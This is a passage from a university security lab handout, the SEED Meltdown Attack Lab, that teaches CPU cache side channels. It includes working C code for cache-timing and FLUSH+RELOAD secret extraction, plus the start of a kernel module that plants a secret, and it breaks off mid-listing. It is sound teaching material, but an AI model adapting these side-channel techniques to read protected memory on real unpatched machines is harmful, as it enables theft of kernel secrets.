

<!DOCTYPE html>
<html class="writer-html4" lang="en" >
<head>
  <meta charset="utf-8" />
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  
  <title>Meltdown Attack Lab &mdash; Network Security Lab  documentation</title>
  

  
  <link rel="stylesheet" href="../../_static/css/theme.css" type="text/css" />
  <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />

  
  

  
  

  

  
  <!--[if lt IE 9]>
    <script src="../../_static/js/html5shiv.min.js"></script>
  <![endif]-->
  
    
      <script type="text/javascript" id="documentation_options" data-url_root="../../" src="../../_static/documentation_options.js"></script>
        <script type="text/javascript" src="../../_static/jquery.js"></script>
        <script type="text/javascript" src="../../_static/underscore.js"></script>
        <script type="text/javascript" src="../../_static/doctools.js"></script>
        <script type="text/javascript" src="../../_static/language_data.js"></script>
        <script async="async" type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
    
    <script type="text/javascript" src="../../_static/js/theme.js"></script>

    
    <link rel="index" title="Index" href="../../genindex.html" />
    <link rel="search" title="Search" href="../../search.html" />
    <link rel="next" title="Spectre Attack Lab" href="spectre_attack.html" />
    <link rel="prev" title="Hardware Labs" href="hardware_index.html" /> 
</head>

<body class="wy-body-for-nav">

   
  <div class="wy-grid-for-nav">
    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search" >
          

          
            <a href="../../index.html" class="icon icon-home"> Network Security Lab
          

          
          </a>

          
            
            
          

          
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>

          
        </div>

        
        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
          
            
            
              
            
            
              <p class="caption"><span class="caption-text">Table of Contents</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="../../xie/xie_labs.html">Xie Labs</a></li>
<li class="toctree-l1 current"><a class="reference internal" href="../seed_index.html">SEED Labs</a><ul class="current">
<li class="toctree-l2"><a class="reference internal" href="../crypto/crypto_index.html">Cryptography Labs</a></li>
<li class="toctree-l2 current"><a class="reference internal" href="hardware_index.html">Hardware Labs</a><ul class="current">
<li class="toctree-l3 current"><a class="current reference internal" href="#">Meltdown Attack Lab</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#introduction">Introduction</a></li>
<li class="toctree-l4"><a class="reference internal" href="#code-compilation">Code Compilation</a></li>
<li class="toctree-l4"><a class="reference internal" href="#tasks-1-and-2-side-channel-attacks-via-cpu-caches">Tasks 1 and 2: Side Channel Attacks via CPU Caches</a></li>
<li class="toctree-l4"><a class="reference internal" href="#tasks-3-5-preparation-for-the-meltdown-attack">Tasks 3-5: Preparation for the Meltdown Attack</a></li>
<li class="toctree-l4"><a class="reference internal" href="#task-6-out-of-order-execution-by-cpu">Task 6: Out-of-Order Execution by CPU</a></li>
<li class="toctree-l4"><a class="reference internal" href="#task-7-the-basic-meltdown-attack">Task 7: The Basic Meltdown Attack</a></li>
<li class="toctree-l4"><a class="reference internal" href="#task-8-make-the-attack-more-practical">Task 8: Make the Attack More Practical</a></li>
<li class="toctree-l4"><a class="reference internal" href="#submission">Submission</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="spectre_attack.html">Spectre Attack Lab</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="../mobile/mobile_index.html">Mobile Security Labs</a></li>
<li class="toctree-l2"><a class="reference internal" href="../network/network_index.html">Network Security Labs</a></li>
<li class="toctree-l2"><a class="reference internal" href="../web/web_index.html">Web Security Labs</a></li>
<li class="toctree-l2"><a class="reference internal" href="../software/software_index.html">Software Security Labs</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../../website_link/web_index.html"><strong>Return To Website</strong></a></li>
</ul>

            
          
        </div>
        
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" aria-label="top navigation">
        
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../../index.html">Network Security Lab</a>
        
      </nav>


      <div class="wy-nav-content">
        
        <div class="rst-content">
        
          

















<div role="navigation" aria-label="breadcrumbs navigation">

  <ul class="wy-breadcrumbs">
    
      <li><a href="../../index.html" class="icon icon-home"></a> &raquo;</li>
        
          <li><a href="../seed_index.html">SEED Labs</a> &raquo;</li>
        
          <li><a href="hardware_index.html">Hardware Labs</a> &raquo;</li>
        
      <li>Meltdown Attack Lab</li>
    
    
      <li class="wy-breadcrumbs-aside">
        
          
        
      </li>
    
  </ul>

  
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
            
  <div class="center docutils container">
Meltdown Attack Lab</div>
<div class="section" id="meltdown-attack-lab">
<h1>Meltdown Attack Lab<a class="headerlink" href="#meltdown-attack-lab" title="Permalink to this headline">¶</a></h1>
<div class="section" id="introduction">
<h2>Introduction<a class="headerlink" href="#introduction" title="Permalink to this headline">¶</a></h2>
<p>Discovered in 2017 and publicly disclosed in January 2018, the Meltdown
exploits critical vulnerabilities existing in many modern processors,
including those from Intel and ARM&nbsp;<a class="reference internal" href="#id6">|6|</a>.
The vulnerabilities allow a user-level program to read data stored
inside the kernel memory. Such an access is not allowed by the hardware
protection mechanism implemented in most CPUs, but a vulnerability
exists in the design of these CPUs that makes it possible to defeat the
hardware protection. Because the flaw exists in the hardware, it is very
difficult to fundamentally fix the problem, unless we change the CPUs in
our computers. The Meltdown vulnerability represents a special genre of
vulnerabilities in the design of CPUs. Along with the Spectre
vulnerability, they provide an invaluable lesson for security education.</p>
<p><em>The learning objective</em> of this lab is for students to gain first-hand
experiences on the Meltdown attack. The attack itself is quite
sophisticated, so we break it down into several small steps, each of
which is easy to understand and perform. Once students understand each
step, it should not be difficult for them to put everything together to
perform the actual attack. Students will use the Meltdown attack to
print out a secret data stored inside the kernel. This lab covers a
number of topics described in the following:</p>
<ul class="simple">
<li>Meltdown attack</li>
<li>Side channel attack</li>
<li>CPU Caching</li>
<li>Out-of-order execution inside CPU microarchitecture</li>
<li>Kernel memory protection in operating system</li>
<li>Kernel module</li>
</ul>
<div class="section" id="downloadable-files">
<h3>Downloadable Files.<a class="headerlink" href="#downloadable-files" title="Permalink to this headline">¶</a></h3>
<p>Please download the following package containing all classes used in this lab <a class="reference download internal" download="" href="../../_downloads/245230ec099bf3a8b6f3ae731da73afd/Files.zip"><code class="xref download docutils literal notranslate"><span class="pre">Here</span></code></a>.</p>
</div>
<div class="section" id="readings-and-videos">
<h3>Readings and videos.<a class="headerlink" href="#readings-and-videos" title="Permalink to this headline">¶</a></h3>
<p>Detailed coverage of the Meltdown attack can be found in the following:</p>
<ul class="simple">
<li>Chapter 13 of the SEED Book, <em>Computer &amp; Internet Security: A
Hands-on Approach</em>, 2nd Edition, by Wenliang Du. See details at
<a class="reference external" href="https://www.handsonsecurity.net">https://www.handsonsecurity.net</a>.</li>
<li>Section 8 of the SEED Lecture, <em>Computer Security: A Hands-on
Approach</em>, by Wenliang Du. See details at
<a class="reference external" href="https://www.handsonsecurity.net/video.html">https://www.handsonsecurity.net/video.html</a>.</li>
</ul>
</div>
<div class="section" id="lab-environment">
<h3>Lab Environment.<a class="headerlink" href="#lab-environment" title="Permalink to this headline">¶</a></h3>
<p>This lab has been tested on our pre-built Ubuntu 16.04 VM, which can be
downloaded from the SEED website. On the SEED Ubuntu 20.04 VM, Tasks 1
to 6 still work as expected, but Tasks 7 and 8 will not work due to the
countermeasures implemented inside the OS.</p>
<p>When using this lab, instructors should keep the followings in mind:
First, the Meltdown vulnerability is a flaw inside Intel CPUs, so if a
student’s machine is an AMD machine, the attack will not work. Second,
Intel is working on fixing this problem in its CPUs, so if a student’s
computer uses new Intel CPUs, the attack may not work. It is not a
problem for now (February 2018), but six months from now, situations
like this may arise. Third, although most students’ computers have
already been patched, the attack is conducted inside our pre-built VM,
which is not patched, so the attack will still be effective. Therefore,
students should not update the VM’s operating system, or the attack may
be fixed.</p>
</div>
<div class="section" id="acknowledgment">
<h3>Acknowledgment<a class="headerlink" href="#acknowledgment" title="Permalink to this headline">¶</a></h3>
<p>This lab was developed with the help of Hao Zhang and Kuber Kohli,
graduate students in the Department of Electrical Engineering and
Computer Science at Syracuse University.</p>
</div>
</div>
<div class="section" id="code-compilation">
<h2>Code Compilation<a class="headerlink" href="#code-compilation" title="Permalink to this headline">¶</a></h2>
<p>For most of our tasks, you need to add <code class="docutils literal notranslate"><span class="pre">-march=native</span></code> flag when
compiling the code with <code class="docutils literal notranslate"><span class="pre">gcc</span></code>. The <code class="docutils literal notranslate"><span class="pre">march</span></code> flag tells the compiler
to enable all instruction subsets supported by the local machine. For
example, we compile <code class="docutils literal notranslate"><span class="pre">myprog.c</span></code> using the following command:</p>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>$ gcc -march=native -o myprog myprog.c
</pre></div>
</div>
</div>
<div class="section" id="tasks-1-and-2-side-channel-attacks-via-cpu-caches">
<h2>Tasks 1 and 2: Side Channel Attacks via CPU Caches<a class="headerlink" href="#tasks-1-and-2-side-channel-attacks-via-cpu-caches" title="Permalink to this headline">¶</a></h2>
<p>Both the Meltdown and Spectre attacks use CPU cache as a side channel to
steal a protected secret. The technique used in this side-channel attack
is called FLUSH+RELOAD&nbsp;<a class="reference internal" href="#id7">|7|</a>. We will study this
technique first. The code developed in these two tasks will be used as a
building block in later tasks.</p>
<p>A CPU cache is a hardware cache used by the CPU of a computer to reduce
the average cost (time or energy) to access data from the main memory.
Accessing data from CPU cache is much faster than accessing from the
main memory. When data are fetched from the main memory, they are
usually cached by the CPU, so if the same data are used again, the
access time will be much faster. Therefore, when a CPU needs to access
some data, it first looks at its caches. If the data is there (this is
called cache hit), it will be fetched directly from there. If the data
is not there (this is called miss), the CPU will go to the main memory
to get the data. The time spent in the latter case is significant
longer. Most modern CPUs have CPU caches.</p>
<div class="align-center figure" id="id8">
<img alt="alternate text" src="../../_images/cachehitmiss.jpg" />
<p class="caption"><span class="caption-text">Figure 1: Cache hit and miss</span></p>
</div>
<div class="section" id="task-1-reading-from-cache-versus-from-memory">
<h3>Task 1: Reading from Cache versus from Memory<a class="headerlink" href="#task-1-reading-from-cache-versus-from-memory" title="Permalink to this headline">¶</a></h3>
<p>The cache memory is used to provide data to the high speed processors at
a faster speed. The cache memories are very fast compared to the main
memory. Let us see the time difference. In the following code
(<code class="docutils literal notranslate"><span class="pre">CacheTime.c</span></code>), we have an array of size <code class="docutils literal notranslate"><span class="pre">10*4096</span></code>. We first access
two of its elements, <code class="docutils literal notranslate"><span class="pre">array[3*4096]</span></code> and <code class="docutils literal notranslate"><span class="pre">array[7*4096]</span></code>. Therefore,
the pages containing these two elements will be cached. We then read the
elements from <code class="docutils literal notranslate"><span class="pre">array[0*4096]</span></code> to <code class="docutils literal notranslate"><span class="pre">array[9*4096]</span></code> and measure the
time spent in the memory reading.
<strong>Figure&nbsp;1</strong> illustrates the difference.
In the code, Line ① reads the CPU’s timestamp (TSC) counter before the
memory read, while Line ② reads the counter after the memory read. Their
difference is the time (in terms of number of CPU cycles) spent in the
memory read. It should be noted that caching is done at the cache block
level, not at the byte level. A typical cache block size is 64 bytes. We
use <code class="docutils literal notranslate"><span class="pre">array[k*4096]</span></code>, so no two elements used in the program fall into
the same cache block.</p>
<div class="literal-block-wrapper docutils container" id="id9">
<span id="listing-1"></span><div class="code-block-caption"><span class="caption-text">Listing 1: CacheTime.c</span><a class="headerlink" href="#id9" title="Permalink to this code">¶</a></div>
<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;emmintrin.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;x86intrin.h&gt;</span><span class="cp"></span>

<span class="kt">uint8_t</span> <span class="n">array</span><span class="p">[</span><span class="mi">10</span><span class="o">*</span><span class="mi">4096</span><span class="p">];</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
  <span class="kt">int</span> <span class="n">junk</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
  <span class="k">register</span> <span class="kt">uint64_t</span> <span class="n">time1</span><span class="p">,</span> <span class="n">time2</span><span class="p">;</span>
  <span class="k">volatile</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">addr</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
  
  <span class="c1">// Initialize the array</span>
  <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">10</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="n">array</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4096</span><span class="p">]</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>

  <span class="c1">// FLUSH the array from the CPU cache</span>
  <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">10</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="n">_mm_clflush</span><span class="p">(</span><span class="o">&amp;</span><span class="n">array</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4096</span><span class="p">]);</span>

  <span class="c1">// Access some of the array items</span>
  <span class="n">array</span><span class="p">[</span><span class="mi">3</span><span class="o">*</span><span class="mi">4096</span><span class="p">]</span> <span class="o">=</span> <span class="mi">100</span><span class="p">;</span>
  <span class="n">array</span><span class="p">[</span><span class="mi">7</span><span class="o">*</span><span class="mi">4096</span><span class="p">]</span> <span class="o">=</span> <span class="mi">200</span><span class="p">;</span>

  <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">10</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">addr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">array</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4096</span><span class="p">];</span>
    <span class="n">time1</span> <span class="o">=</span> <span class="n">__rdtscp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">junk</span><span class="p">);</span>                
    <span class="n">junk</span> <span class="o">=</span> <span class="o">*</span><span class="n">addr</span><span class="p">;</span>
    <span class="n">time2</span> <span class="o">=</span> <span class="n">__rdtscp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">junk</span><span class="p">)</span> <span class="o">-</span> <span class="n">time1</span><span class="p">;</span>       
    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Access time for array[%d*4096]: %d CPU cycles</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">i</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">time2</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
</div>
<p>Please compile the following code using
<code class="docutils literal notranslate"><span class="pre">gcc</span> <span class="pre">-march=native</span> <span class="pre">CacheTime.c</span></code>, and run it. Is the access of
<code class="docutils literal notranslate"><span class="pre">array[3*4096]</span></code> and <code class="docutils literal notranslate"><span class="pre">array[7*4096]</span></code> faster than that of the other
elements? You should run the program at least 10 times and describe your
observations. From the experiment, you need to find a threshold that can
be used to distinguish these two types of memory access: accessing data
from the cache versus accessing data from the main memory. This
threshold is important for the rest of the tasks in this lab.</p>
</div>
<div class="section" id="task-2-using-cache-as-a-side-channel">
<h3>Task 2: Using Cache as a Side Channel<a class="headerlink" href="#task-2-using-cache-as-a-side-channel" title="Permalink to this headline">¶</a></h3>
<div class="align-center figure" id="id10">
<img alt="Diagram depicting the Side Channel Attack" src="../../_images/flushreload.jpg" />
<p class="caption"><span class="caption-text">Figure 2: Diagram depicting the Side Channel Attack</span></p>
</div>
<p>The objective of this task is to use the side channel to extract a
secret value used by the victim function. Assume there is a victim
function that uses a secret value as index to load some values from an
array. Also assume that the secret value cannot be accessed from the
outside. Our goal is to use side channels to get this secret value. The
technique that we will be using is called
FLUSH+RELOAD&nbsp;<a class="reference internal" href="#id7">|7|</a>.
<strong>Figure&nbsp;2</strong> illustrates the technique,
which consists of three steps:</p>
<ol class="arabic simple">
<li>FLUSH the entire array from the cache memory to make sure the array
is not cached.</li>
<li>Invoke the victim function, which accesses one of the array elements
based on the value of the secret. This action causes the
corresponding array element to be cached.</li>
<li>RELOAD the entire array, and measure the time it takes to reload each
element. If one specific element’s loading time is fast, it is very
likely that element is already in the cache. This element must be the
one accessed by the victim function. Therefore, we can figure out
what the secret value is.</li>
</ol>
<p>The following program uses the FLUSH+RELOAD technique to find out a
one-byte secret value contained in the variable <code class="docutils literal notranslate"><span class="pre">secret</span></code>. Since there
are 256 possible values for a one-byte secret, we need to map each value
to an array element. The naive way is to define an array of 256 elements
(i.e., <code class="docutils literal notranslate"><span class="pre">array[256]</span></code>). However, this does not work. Caching is done at
a block level, not at a byte level. If <code class="docutils literal notranslate"><span class="pre">array[k]</span></code> is accessed, a block
of memory containing this element will be cached. Therefore, the
adjacent elements of <code class="docutils literal notranslate"><span class="pre">array[k]</span></code> will also be cached, making it
difficult to infer what the secret is. To solve this problem, we create
an array of <code class="docutils literal notranslate"><span class="pre">256*4096</span></code> bytes. Each element used in our RELOAD step is
<code class="docutils literal notranslate"><span class="pre">array[k*4096]</span></code>. Because <code class="docutils literal notranslate"><span class="pre">4096</span></code> is larger than a typical cache block
size (64 bytes), no two different elements <code class="docutils literal notranslate"><span class="pre">array[i*4096]</span></code> and
<code class="docutils literal notranslate"><span class="pre">array[j*4096]</span></code> will be in the same cache block.</p>
<p>Since <code class="docutils literal notranslate"><span class="pre">array[0*4096]</span></code> may fall into the same cache block as the
variables in the adjacent memory, it may be accidentally cached due to
the caching of those variables. Therefore, we should avoid using
<code class="docutils literal notranslate"><span class="pre">array[0*4096]</span></code> in the FLUSH+RELOAD method (for other index <code class="docutils literal notranslate"><span class="pre">k</span></code>,
<code class="docutils literal notranslate"><span class="pre">array[k*4096]</span></code> does not have a problem). To make it consistent in the
program, we use <code class="docutils literal notranslate"><span class="pre">array[k*4096</span> <span class="pre">+</span> <span class="pre">DELTA]</span></code> for all <code class="docutils literal notranslate"><span class="pre">k</span></code> values, where
<code class="docutils literal notranslate"><span class="pre">DELTA</span></code> is defined as a constant <code class="docutils literal notranslate"><span class="pre">1024</span></code>.</p>
<div class="literal-block-wrapper docutils container" id="id11">
<span id="listing-2"></span><div class="code-block-caption"><span class="caption-text">Listing 2: FlushReload.c</span><a class="headerlink" href="#id11" title="Permalink to this code">¶</a></div>
<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;emmintrin.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;x86intrin.h&gt;</span><span class="cp"></span>

<span class="kt">uint8_t</span> <span class="n">array</span><span class="p">[</span><span class="mi">256</span><span class="o">*</span><span class="mi">4096</span><span class="p">];</span>
<span class="kt">int</span> <span class="n">temp</span><span class="p">;</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">secret</span> <span class="o">=</span> <span class="mi">94</span><span class="p">;</span>

<span class="cm">/* cache hit time threshold assumed*/</span>
<span class="cp">#define CACHE_HIT_THRESHOLD (80)</span>
<span class="cp">#define DELTA 1024</span>

<span class="kt">void</span> <span class="nf">flushSideChannel</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>

  <span class="c1">// Write to array to bring it to RAM to prevent Copy-on-write</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="n">array</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4096</span> <span class="o">+</span> <span class="n">DELTA</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>

  <span class="c1">//flush the values of the array from cache</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="n">_mm_clflush</span><span class="p">(</span><span class="o">&amp;</span><span class="n">array</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4096</span> <span class="o">+</span> <span class="n">DELTA</span><span class="p">]);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">victim</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">temp</span> <span class="o">=</span> <span class="n">array</span><span class="p">[</span><span class="n">secret</span><span class="o">*</span><span class="mi">4096</span> <span class="o">+</span> <span class="n">DELTA</span><span class="p">];</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">reloadSideChannel</span><span class="p">()</span> 
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">junk</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
  <span class="k">register</span> <span class="kt">uint64_t</span> <span class="n">time1</span><span class="p">,</span> <span class="n">time2</span><span class="p">;</span>
  <span class="k">volatile</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">addr</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
  <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
     <span class="n">addr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">array</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4096</span> <span class="o">+</span> <span class="n">DELTA</span><span class="p">];</span>
     <span class="n">time1</span> <span class="o">=</span> <span class="n">__rdtscp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">junk</span><span class="p">);</span>
     <span class="n">junk</span> <span class="o">=</span> <span class="o">*</span><span class="n">addr</span><span class="p">;</span>
     <span class="n">time2</span> <span class="o">=</span> <span class="n">__rdtscp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">junk</span><span class="p">)</span> <span class="o">-</span> <span class="n">time1</span><span class="p">;</span>
     <span class="k">if</span> <span class="p">(</span><span class="n">time2</span> <span class="o">&lt;=</span> <span class="n">CACHE_HIT_THRESHOLD</span><span class="p">){</span>
         <span class="n">printf</span><span class="p">(</span><span class="s">&quot;array[%d*4096 + %d] is in cache.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">i</span><span class="p">,</span><span class="n">DELTA</span><span class="p">);</span>
         <span class="n">printf</span><span class="p">(</span><span class="s">&quot;The Secret = %d.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">i</span><span class="p">);</span>
     <span class="p">}</span>
  <span class="p">}</span>	
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> 
<span class="p">{</span>
  <span class="n">flushSideChannel</span><span class="p">();</span>
  <span class="n">victim</span><span class="p">();</span>
  <span class="n">reloadSideChannel</span><span class="p">();</span>
  <span class="k">return</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
</div>
</div>
<p>Please compile the program using <code class="docutils literal notranslate"><span class="pre">gcc</span></code> and run it (see
<strong>Section&nbsp;2</strong> for compilation
instruction). It should be noted that the technique is not 100 percent
accurate, and you may not be able to observe the expected output all the
time. Run the program for at least 20 times, and count how many times
you will get the secret correctly. You can also adjust the threshold
<code class="docutils literal notranslate"><span class="pre">CACHE_HIT_THRESHOLD</span></code> to the one derived from Task 1 (80 is used in
this code).</p>
</div>
</div>
<div class="section" id="tasks-3-5-preparation-for-the-meltdown-attack">
<h2>Tasks 3-5: Preparation for the Meltdown Attack<a class="headerlink" href="#tasks-3-5-preparation-for-the-meltdown-attack" title="Permalink to this headline">¶</a></h2>
<p>Memory isolation is the foundation of system security. In most operating
systems, kernel memory is not directly accessible to user-space
programs. This isolation is achieved by a supervisor bit of the
processor that defines whether a memory page of the kernel can be
accessed or not. This bit is set when CPU enters the kernel space and
cleared when it exits to the user
space&nbsp;<a class="reference internal" href="#id3">|3|</a>. With this feature, kernel
memory can be safely mapped into the address space of every process, so
the page table does not need to change when a user-level program traps
into the kernel. However, this isolation feature is broken by the
Meltdown attack, which allow unprivileged user-level programs to read
arbitrary kernel memory.</p>
<div class="section" id="task-3-place-secret-data-in-kernel-space">
<h3>Task 3: Place Secret Data in Kernel Space<a class="headerlink" href="#task-3-place-secret-data-in-kernel-space" title="Permalink to this headline">¶</a></h3>
<p>To simplify our attack, we store a secret data in the kernel space, and
we show how a user-level program can find out what the secret data is.
We use a kernel module to store the secret data. The implementation of
the kernel module is provided in <code class="docutils literal notranslate"><span class="pre">MeltdownKernel.c</span></code>. Students’ task is
to compile and install the kernel module. The code is shown below.</p>
<div class="literal-block-wrapper docutils container" id="id12">
<span id="listing-3"></span><div class="code-block-caption"><span class="caption-text">Listing 3: MeltdownKernel.c</span><a class="headerlink" href="#id12" title="Permalink to this code">¶</a></div>
<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;linux/module.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;linux/kernel.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;linux/init.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;linux/vmalloc.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;linux/version.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;linux/proc_fs.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;linux/seq_file.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;linux/uaccess.h&gt;</span><span class="cp"></span>

<span class="k">static</span> <span class="kt">char</span> <span class="n">secret</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="sc">&#39;S&#39;</span><span class="p">,</span><span class="sc">&#39;E&#39;</span><span class="p">,</span><span class="sc">&#39;E&#39;</span><span class="p">,</span><span class="sc">&#39;D&#39;</span><span class="p">,</span><span class="sc">&#39;L&#39;</span><span class="p">,</span><span class="sc">&#39;a&#39;</span><span class="p">,</span><span class="sc">&#39;b&#39;</span><span class="p">,</span><span class="sc">&#39;s&#39;</span><span class="p">};</span>
<span class="k">static</span> <span class="k">struct</span> <span class="n">proc_dir_entry</span> <span class="o">*</span><span class="n">secret_entry</span><span class="p">;</span>
<span class="k">static</span> <span class="kt">char</span><span class="o">*</span> <span class="n">secret_buffer</span><span class="p">;</span>

<span class="k">static</span> <span class="kt">int</span> <span class="nf">test_proc_open</span><span class="p">(</span><span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">inode</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">)</span>
<span class="p">{</span>
<span class="cp">#if LINUX_VERSION_CODE &lt;= KERNEL_VERSION(4,0,0)</span>
   <span class="k">return</span> <span class="n">single_open</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">PDE</span><span class="p">(</span><span class="n">inode</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">);</span>
<span class="cp">#else</span>
   <span class="k">return</span> <span class="n">single_open</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">PDE_DATA</span><span class="p">(</span><span class="n">inode</span><span class="p">));</span>
<span class="cp">#endif</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">ssize_t</span> <span class="nf">read_proc</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">filp</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> 
